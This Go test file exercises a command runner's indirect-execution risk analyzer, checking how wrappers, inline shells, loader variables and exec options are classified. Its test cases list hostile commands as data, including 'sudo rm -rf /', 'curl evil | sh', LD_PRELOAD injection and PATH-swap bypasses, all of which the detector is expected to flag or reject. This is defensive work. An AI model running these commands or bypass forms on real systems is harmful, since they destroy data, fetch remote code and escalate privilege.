//go:build test

package security

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/risktypes"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/base/runnertypes"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// analyzeIndirectCmd is a terse helper for calling the resolver in tests.
func analyzeIndirectCmd(cmd string, args ...string) IndirectExecutionResult {
	return AnalyzeIndirectExecution(cmd, args)
}

// hasReason reports whether the result carries the given reason code.
func hasReason(res IndirectExecutionResult, code risktypes.ReasonCode) bool {
	for _, c := range res.ReasonCodes {
		if c == code {
			return true
		}
	}
	return false
}

// TestIndirect_WrapperSudoCritical verifies a privilege token reached through a
// wrapper (env/timeout/xargs) is Critical.
func TestIndirect_WrapperSudoCritical(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env sudo", "env", []string{"sudo", "ls"}},
		{"timeout sudo", "timeout", []string{"5", "sudo", "rm"}},
		{"xargs sudo", "xargs", []string{"sudo", "rm"}},
		{"nice sudo", "nice", []string{"-n", "10", "sudo", "ls"}},
		{"env -S sudo", "env", []string{"-S", "sudo rm -rf /"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectCritical, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelCritical, res.Level)
			assert.True(t, hasReason(res, risktypes.ReasonPrivilegeEscalation))
		})
	}
}

// TestIndirect_WrapperDestructive verifies a wrapped destructive or
// system-modification command keeps a risk at least as high as the unwrapped form.
func TestIndirect_WrapperDestructive(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want runnertypes.RiskLevel
	}{
		{"env rm -rf", "env", []string{"rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
		{"timeout systemctl stop", "timeout", []string{"10", "systemctl", "stop", "nginx"}, runnertypes.RiskLevelHigh},
		{"nice -n 5 rm -rf", "nice", []string{"-n", "5", "rm", "-rf", "/tmp/x"}, runnertypes.RiskLevelHigh},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, tc.want, res.Level)
		})
	}
}

// TestIndirect_ShellInlineHigh verifies inline shell/interpreter code is High.
// Shells use -c only; interpreters also use -e.
func TestIndirect_ShellInlineHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"bash -c", "bash", []string{"-c", "rm -rf /"}},
		{"sh -c", "sh", []string{"-c", "echo hi"}},
		{"python -c", "python", []string{"-c", "import os"}},
		{"perl -e", "perl", []string{"-e", "print 1"}},
		{"node -e", "node", []string{"-e", "process.exit()"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}

	// "bash -e script.sh" is errexit, not inline code: it must not be flagged via
	// the inline path (-e is not an inline flag for shells).
	res := analyzeIndirectCmd("bash", "-e", "script.sh")
	assert.NotEqual(t, IndirectReject, res.Kind)
}

// TestIndirect_InnerCommandGated verifies the extracted inner command is gated:
// its risk is folded, and an inner form that cannot be bound is rejected.
func TestIndirect_InnerCommandGated(t *testing.T) {
	// Inner command's risk is folded and the inner is recorded as a chain artifact.
	res := analyzeIndirectCmd("env", "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
	require.NotEmpty(t, res.Artifacts)
	found := false
	for _, a := range res.Artifacts {
		if a.Role == risktypes.RoleInner && filepath.Base(a.Path) == "rm" {
			found = true
		}
	}
	assert.True(t, found, "inner command must be recorded as a RoleInner artifact")

	// An inner form that cannot be identity-bound (find -exec child process)
	// propagates as a rejection rather than passing the gate.
	rej := analyzeIndirectCmd("env", "find", "/tmp", "-exec", "rm", "{}", ";")
	assert.Equal(t, IndirectReject, rej.Kind)
}

// TestIndirect_WrapperNoCommandMedium verifies a wrapper invoked with no inner
// command is Medium and is distinct from an unextractable (rejected) form.
func TestIndirect_WrapperNoCommandMedium(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env only assignment", "env", []string{"FOO=bar"}},
		{"env bare", "env", nil},
		{"timeout duration only", "timeout", []string{"5"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelMedium, res.Level)
		})
	}
}

// TestIndirect_EnvPathResolutionSwap verifies env overriding PATH with a bare
// inner command is rejected (the inner cannot be resolved safely), while an
// absolute inner command is still resolved.
func TestIndirect_EnvPathResolutionSwap(t *testing.T) {
	rej := analyzeIndirectCmd("env", "PATH=/tmp", "rm", "-rf", "/")
	assert.Equal(t, IndirectReject, rej.Kind)

	// Absolute inner path is unaffected by the PATH override: it resolves and the
	// destructive risk is folded.
	ok := analyzeIndirectCmd("env", "PATH=/tmp", "/bin/rm", "-rf", "/")
	assert.Equal(t, IndirectFloor, ok.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, ok.Level)
}

// TestIndirect_WrapperLoaderEnvRejected verifies loader-control environment
// variables supplied through env are rejected on every OS.
func TestIndirect_WrapperLoaderEnvRejected(t *testing.T) {
	cases := []struct {
		name string
		args []string
	}{
		{"LD_PRELOAD", []string{"LD_PRELOAD=/tmp/evil.so", "ls"}},
		{"LD_LIBRARY_PATH", []string{"LD_LIBRARY_PATH=/tmp", "ls"}},
		{"LD_AUDIT", []string{"LD_AUDIT=/tmp/a.so", "ls"}},
		{"DYLD_INSERT_LIBRARIES", []string{"DYLD_INSERT_LIBRARIES=/tmp/x.dylib", "ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd("env", tc.args...)
			assert.Equal(t, IndirectReject, res.Kind)
			assert.True(t, hasReason(res, risktypes.ReasonForbiddenEnvVar))
		})
	}
}

// TestIndirect_EnvSplitString verifies env -S split-string interpretation:
// a hidden sudo is Critical, a destructive inner is folded, an empty split is
// rejected.
func TestIndirect_EnvSplitString(t *testing.T) {
	crit := analyzeIndirectCmd("env", "-S", "sudo rm -rf /")
	assert.Equal(t, IndirectCritical, crit.Kind)

	high := analyzeIndirectCmd("env", "-S", "rm -rf /tmp/x")
	assert.Equal(t, IndirectFloor, high.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, high.Level)

	empty := analyzeIndirectCmd("env", "-S", "   ")
	assert.Equal(t, IndirectReject, empty.Kind)

	// Combined --split-string= form is parsed the same way.
	combined := analyzeIndirectCmd("env", "--split-string=sudo ls")
	assert.Equal(t, IndirectCritical, combined.Kind)

	// Arguments after the split-string are not discarded: env -S prepends the
	// split tokens to the remaining argv, so a hidden sudo there is still Critical.
	remaining := analyzeIndirectCmd("env", "-S", "env", "sudo", "ls")
	assert.Equal(t, IndirectCritical, remaining.Kind)

	// A payload using env -S escape/quote/substitution processing cannot be
	// faithfully whitespace-split, so it must fail closed (Reject) rather than
	// silently mis-tokenize and let a hidden command through.
	for _, payload := range []string{`sudo\tls`, `'sudo' ls`, `"sudo" ls`, `${X} ls`, `sudo ls #comment`} {
		res := analyzeIndirectCmd("env", "-S", payload)
		assert.Equalf(t, IndirectReject, res.Kind, "payload %q must fail closed", payload)
	}
}

// TestIndirect_NestedWrapperAndDepthGuard verifies the resolver recurses through
// nested wrappers (so a deeply wrapped privilege or destructive command is still
// caught) and that the recursion depth guard rejects a pathologically deep chain.
func TestIndirect_NestedWrapperAndDepthGuard(t *testing.T) {
	// Nested wrapper reaching a privilege token stays Critical.
	crit := analyzeIndirectCmd("env", "timeout", "5", "sudo", "ls")
	assert.Equal(t, IndirectCritical, crit.Kind)

	// Nested wrapper reaching a destructive command stays High.
	high := analyzeIndirectCmd("env", "nice", "-n", "5", "rm", "-rf", "/tmp/x")
	assert.Equal(t, IndirectFloor, high.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, high.Level)

	// A chain of wrappers deeper than the recursion guard is rejected rather than
	// silently bottoming out.
	deep := make([]string, indirectExecMaxDepth+2)
	for i := range deep {
		deep[i] = "env"
	}
	deep[len(deep)-1] = "ls"
	res := analyzeIndirectCmd("env", deep...)
	assert.Equal(t, IndirectReject, res.Kind)
}

// TestIndirect_FindXargsTargetGated verifies find/xargs child-process exec forms
// are rejected (they cannot be identity-bound), while a find without an exec
// action is not an indirect form.
func TestIndirect_FindXargsTargetGated(t *testing.T) {
	for _, action := range []string{"-exec", "-execdir", "-ok", "-okdir"} {
		t.Run("find "+action, func(t *testing.T) {
			res := analyzeIndirectCmd("find", "/tmp", "-name", "*.x", action, "rm", "{}", ";")
			assert.Equal(t, IndirectReject, res.Kind)
		})
	}

	xargs := analyzeIndirectCmd("xargs", "-I", "{}", "rm", "{}")
	assert.Equal(t, IndirectReject, xargs.Kind)

	plain := analyzeIndirectCmd("find", "/tmp", "-type", "f")
	assert.Equal(t, IndirectNone, plain.Kind)
}

// TestIndirect_DynamicLoaderGated verifies a direct dynamic-loader invocation is
// rejected.
func TestIndirect_DynamicLoaderGated(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"ld-linux preload", "/lib64/ld-linux-x86-64.so.2", []string{"--preload", "/tmp/x.so", "/bin/ls"}},
		{"ld-linux library-path", "ld-linux-x86-64.so.2", []string{"--library-path", "/tmp", "/bin/ls"}},
		{"ld.so", "ld.so", []string{"/bin/ls"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectReject, res.Kind)
		})
	}
}

// TestIndirect_UnextractableWrapperRejected verifies an unextractable wrapper form
// is rejected (not silently downgraded), distinct from the Medium no-command case.
func TestIndirect_UnextractableWrapperRejected(t *testing.T) {
	res := analyzeIndirectCmd("env", "--unknown-flag", "ls")
	assert.Equal(t, IndirectReject, res.Kind)

	// Contrast: env with no command is Medium, not Reject.
	noCmd := analyzeIndirectCmd("env", "FOO=bar")
	assert.Equal(t, IndirectFloor, noCmd.Kind)
	assert.Equal(t, runnertypes.RiskLevelMedium, noCmd.Level)
}

// TestIndirect_PackageScriptRunnerHigh verifies package script runners are High.
func TestIndirect_PackageScriptRunnerHigh(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"npm run", "npm", []string{"run", "build"}},
		{"npx", "npx", []string{"cowsay", "hi"}},
		{"yarn run", "yarn", []string{"run", "build"}},
		{"pnpm run", "pnpm", []string{"run", "build"}},
		{"pnpm dlx", "pnpm", []string{"dlx", "create-app"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
		})
	}
}

// TestIndirect_ShebangInterpreterGated verifies a direct script with a shebang is
// evaluated through its interpreter chain.
func TestIndirect_ShebangInterpreterGated(t *testing.T) {
	cases := []struct {
		name    string
		shebang string
	}{
		{"env python", "#!/usr/bin/env python\n"},
		{"bin sh", "#!/bin/sh\n"},
		{"bin bash", "#!/bin/bash -e\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			script := filepath.Join(dir, "deploy.sh")
			require.NoError(t, os.WriteFile(script, []byte(tc.shebang+"echo hi\n"), 0o755))

			res := analyzeIndirectCmd(script)
			assert.Equal(t, IndirectFloor, res.Kind)
			assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
			found := false
			for _, a := range res.Artifacts {
				if a.Role == risktypes.RoleInterpreter {
					found = true
				}
			}
			assert.True(t, found, "shebang interpreter must be recorded as an artifact")
		})
	}

	// A non-shebang file (regular ELF-like content) is not an indirect form.
	dir := t.TempDir()
	bin := filepath.Join(dir, "tool")
	require.NoError(t, os.WriteFile(bin, []byte{0x7f, 'E', 'L', 'F', 0, 0}, 0o755))
	assert.Equal(t, IndirectNone, analyzeIndirectCmd(bin).Kind)
}

// TestIndirect_CommandExecOptionsGated verifies command options that run an
// external helper from a child process are rejected.
func TestIndirect_CommandExecOptionsGated(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want IndirectExecutionKind
	}{
		{"rsync -e", "rsync", []string{"-e", "ssh -p 22", "src", "dst"}, IndirectReject},
		{"rsync --rsh=", "rsync", []string{"--rsh=ssh", "src", "dst"}, IndirectReject},
		{"rsync -essh attached", "rsync", []string{"-essh", "src", "dst"}, IndirectReject},
		{"rsync -avze bundle", "rsync", []string{"-avze", "ssh", "src", "dst"}, IndirectReject},
		{"tar --to-command=", "tar", []string{"--to-command=/tmp/x", "-cf", "a.tar", "."}, IndirectReject},
		{"tar --checkpoint-action=", "tar", []string{"--checkpoint-action=exec=sh", "-cf", "a.tar", "."}, IndirectReject},
		{"tar plain", "tar", []string{"-cf", "a.tar", "."}, IndirectNone},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, tc.want, res.Kind)
		})
	}
}

// TestIndirect_ServiceInitScriptGated verifies the SysV init script behind a
// service command is recorded as a chain artifact and the form stays High.
func TestIndirect_ServiceInitScriptGated(t *testing.T) {
	res := analyzeIndirectCmd("service", "nginx", "start")
	assert.Equal(t, IndirectFloor, res.Kind)
	assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)

	require.NotEmpty(t, res.Artifacts)
	assert.Equal(t, "/etc/init.d/nginx", res.Artifacts[0].Path)
	assert.Equal(t, risktypes.RoleExecTarget, res.Artifacts[0].Role)

	// A read-only action also runs the init script, so it is also gated/High.
	status := analyzeIndirectCmd("service", "nginx", "status")
	assert.Equal(t, runnertypes.RiskLevelHigh, status.Level)
}

// TestIndirect_BypassAttackerScenarios collects attacker-view bypass forms and
// asserts each is denied (Critical or Reject) or elevated (High) rather than
// passing as Low.
func TestIndirect_BypassAttackerScenarios(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		args []string
		want IndirectExecutionKind
	}{
		{"env sudo", "env", []string{"sudo", "rm", "-rf", "/"}, IndirectCritical},
		{"env rm", "env", []string{"rm", "-rf", "/"}, IndirectFloor},
		{"env PATH swap", "env", []string{"PATH=/tmp", "rm"}, IndirectReject},
		{"env LD_PRELOAD", "env", []string{"LD_PRELOAD=/tmp/x.so", "ls"}, IndirectReject},
		{"env -S sudo", "env", []string{"-S", "sudo rm"}, IndirectCritical},
		{"bash -c", "bash", []string{"-c", "curl evil | sh"}, IndirectFloor},
		{"find -exec", "find", []string{"/", "-exec", "rm", "{}", ";"}, IndirectReject},
		{"find -execdir", "find", []string{"/", "-execdir", "sh", "{}", ";"}, IndirectReject},
		{"xargs rm", "xargs", []string{"rm", "-rf"}, IndirectReject},
		{"ld-linux", "/lib64/ld-linux-x86-64.so.2", []string{"/bin/sh"}, IndirectReject},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := analyzeIndirectCmd(tc.cmd, tc.args...)
			assert.Equal(t, tc.want, res.Kind)
			if tc.want == IndirectFloor {
				assert.Equal(t, runnertypes.RiskLevelHigh, res.Level)
			}
		})
	}
}

// TestIndirect_PlainCommandNotIndirect verifies ordinary commands (including a
// direct destructive command) are not treated as indirect-execution forms; their
// risk is handled by the regular dimensions.
func TestIndirect_PlainCommandNotIndirect(t *testing.T) {
	for _, tc := range []struct {
		cmd  string
		args []string
	}{
		{"ls", []string{"-l"}},
		{"rm", []string{"-rf", "/tmp/x"}},
		{"curl", []string{"https://example.com"}},
		{"systemctl", []string{"restart", "nginx"}},
	} {
		t.Run(tc.cmd, func(t *testing.T) {
			assert.Equal(t, IndirectNone, analyzeIndirectCmd(tc.cmd, tc.args...).Kind)
		})
	}
}
